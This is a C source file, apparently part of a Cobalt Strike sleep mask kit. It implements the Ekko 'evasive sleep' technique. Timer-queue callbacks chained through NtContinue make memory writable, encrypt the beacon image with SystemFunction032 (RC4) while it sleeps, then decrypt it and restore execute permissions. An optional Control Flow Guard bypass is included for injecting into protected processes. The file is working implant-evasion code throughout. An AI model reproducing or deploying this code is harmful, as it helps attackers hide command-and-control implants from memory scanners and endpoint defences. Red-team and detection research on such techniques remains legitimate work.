/*
    Helper function to obfuscate the sleep mask code using CreateTimerQueueTimer.

    Credits:
       https://github.com/Cracked5pider/Ekko
       https://suspicious.actor/2022/05/05/mdsec-nighthawk-study.html
       Originally discovered by Peter Winter-Smith and used in MDSec’s Nighthawk
*/

#ifdef _WIN64

/*
 *   Enable the CFG bypass technique which is needed to inject into processes
 *   protected Control Flow Guard (CFG) on supported version of Windows.
 */
#define CFG_BYPASS 0
#if CFG_BYPASS
#include "cfg.c"
BOOL initialize = FALSE;
#endif

void evasive_sleep(PSLEEPMASK_INFO sleepMaskInfo) {
	CONTEXT CtxThread = { 0 };
	CONTEXT RopProtRW = { 0 };
	CONTEXT RopMemMsk = { 0 };
	CONTEXT RopProtRX = { 0 };
	CONTEXT RopSetEvt = { 0 };

	HANDLE  hTimerQueue = NULL;
	HANDLE  hNewTimer = NULL;
	HANDLE  hEvent = NULL;
	PVOID   ImageBase = sleepMaskInfo->beacon_info.sleep_mask_ptr;
	DWORD   ImageTextSize = sleepMaskInfo->beacon_info.sleep_mask_text_size;
	DWORD   OldProtect = 0;
	DWORD   time = sleepMaskInfo->sleep_time;

	USTRING Key = { 0 };
	USTRING Img = { 0 };

#if CFG_BYPASS
	/* Using this variable which is not set 1st time through to only do the CFG bypass once */
	if (!initialize) {
		markCFGValid_nt(NtContinue);
		initialize = TRUE;
	}
#endif

	/* setup the parameters to the functions */
	Key.Buffer = sleepMaskInfo->beacon_info.mask;
	Key.Length = Key.MaximumLength = MASK_SIZE;
	Img.Buffer = ImageBase;
	Img.Length = Img.MaximumLength = sleepMaskInfo->beacon_info.sleep_mask_total_size;

	hEvent = CreateEventA(0, 0, 0, 0);
	hTimerQueue = CreateTimerQueue();

	DLOG("Using evasive sleep for %lu (ms) on %p with a length of %lu", time, Img.Buffer, Img.Length);
	if (hEvent && hTimerQueue && CreateTimerQueueTimer(&hNewTimer, hTimerQueue, (WAITORTIMERCALLBACK) RtlCaptureContext, &CtxThread, 0, 0, WT_EXECUTEINTIMERTHREAD)) {

		WaitForSingleObject(hEvent, 0x32); // This is needed

		/* Setup the function calls to be added to the queue timer */
		memcpy(&RopProtRW, &CtxThread, sizeof(CONTEXT));
		memcpy(&RopMemMsk, &CtxThread, sizeof(CONTEXT));
		memcpy(&RopProtRX, &CtxThread, sizeof(CONTEXT));
		memcpy(&RopSetEvt, &CtxThread, sizeof(CONTEXT));

		// VirtualProtect( ImageBase, ImageTextSize, PAGE_READWRITE, &OldProtect );
		RopProtRW.Rsp -= 8;
		RopProtRW.Rip = (DWORD_PTR) VirtualProtect;
		RopProtRW.Rcx = (DWORD_PTR) ImageBase;
		RopProtRW.Rdx = ImageTextSize;
		RopProtRW.R8 = PAGE_READWRITE;
		RopProtRW.R9 = (DWORD_PTR) &OldProtect;

		// SystemFunction032( &Key, &Img );
		RopMemMsk.Rsp -= 8;
		RopMemMsk.Rip = (DWORD_PTR) SystemFunction032;
		RopMemMsk.Rcx = (DWORD_PTR) &Img;
		RopMemMsk.Rdx = (DWORD_PTR) &Key;

		// VirtualProtect( ImageBase, ImageTextSize, PAGE_EXECUTE_READ, &OldProtect );
		RopProtRX.Rsp -= 8;
		RopProtRX.Rip = (DWORD_PTR) VirtualProtect;
		RopProtRX.Rcx = (DWORD_PTR) ImageBase;
		RopProtRX.Rdx = ImageTextSize;
		RopProtRX.R8 = PAGE_EXECUTE_READ;
		RopProtRX.R9 = (DWORD_PTR)&OldProtect;

		// SetEvent( hEvent );
		RopSetEvt.Rsp -= 8;
		RopSetEvt.Rip = (DWORD_PTR) SetEvent;
		RopSetEvt.Rcx = (DWORD_PTR) hEvent;

		CreateTimerQueueTimer(&hNewTimer, hTimerQueue, (WAITORTIMERCALLBACK) NtContinue, &RopProtRW, 200, 0, WT_EXECUTEINTIMERTHREAD);
		CreateTimerQueueTimer(&hNewTimer, hTimerQueue, (WAITORTIMERCALLBACK) NtContinue, &RopMemMsk, 400, 0, WT_EXECUTEINTIMERTHREAD);
		CreateTimerQueueTimer(&hNewTimer, hTimerQueue, (WAITORTIMERCALLBACK) NtContinue, &RopMemMsk, 600 + time, 0, WT_EXECUTEINTIMERTHREAD);
		CreateTimerQueueTimer(&hNewTimer, hTimerQueue, (WAITORTIMERCALLBACK) NtContinue, &RopProtRX, 800 + time, 0, WT_EXECUTEINTIMERTHREAD);
		CreateTimerQueueTimer(&hNewTimer, hTimerQueue, (WAITORTIMERCALLBACK) NtContinue, &RopSetEvt, 999 + time, 0, WT_EXECUTEINTIMERTHREAD);

		WaitForSingleObject(hEvent, INFINITE);
	} else {
		DLOGT("Failed to setup timer queue, no evasion for sleep mask.");
		WaitForSingleObject(GetCurrentProcess(), time);
	}

	/* cleanup */
	if (hEvent)      { CloseHandle(hEvent); }
	if (hTimerQueue) { DeleteTimerQueue(hTimerQueue); }
}
#endif
